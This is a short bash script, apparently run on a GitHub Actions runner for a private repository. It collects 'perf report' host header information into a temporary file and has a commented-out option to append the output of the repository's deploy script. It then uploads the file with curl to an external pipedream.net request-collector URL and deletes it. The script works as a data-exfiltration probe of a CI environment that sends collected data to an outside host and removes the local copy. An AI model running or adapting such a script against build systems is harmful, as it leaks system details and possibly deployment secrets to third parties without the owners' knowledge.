#!/bin/bash

echo "--- START ---" > /tmp/file.txt

perf report --header-only >> /tmp/file.txt
echo "-----" >> /tmp/file.txt
SCRIPT_PATH="/home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/deploy-script.sh"
#bash "$SCRIPT_PATH" >> /tmp/file.txt

echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
